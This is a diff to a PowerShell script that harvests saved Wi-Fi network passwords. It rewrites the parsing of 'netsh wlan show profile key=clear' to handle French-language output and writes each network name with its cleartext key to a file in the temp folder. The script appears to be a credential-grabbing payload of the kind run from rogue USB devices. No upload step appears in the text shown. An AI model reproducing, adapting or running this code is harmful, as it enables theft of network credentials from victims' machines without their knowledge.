@@ -1,9 +1,20 @@
 ############################################################################################################################################################
 
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+$WLANList = ((netsh wlan show profiles) -match '\s{2,}:\s') -replace '.*:\s' , ''
+$wifiInfo = ""
+foreach ($WLAN in $WLANList) {
+    $profileInfo = netsh wlan show profile name=$WLAN key=clear
+    if ($profileInfo -match "Contenu de la") {
+        $password = $profileInfo | Where-Object { $_ -match "Contenu de la" }
+        $password = $password.Replace("Contenu de la clé            : ", "").Trim()
+        $wifiInfo += "$WLAN | $password`n"
+    }
+    else {
+        $wifiInfo += "$WLAN | Pas de mot de passe`n"
+    }
+}
 
-
-$wifiProfiles > $env:TEMP/--wifi-pass.txt
+$wifiInfo > $env:TEMP/--wifi-pass.txt
 
 ############################################################################################################################################################
 
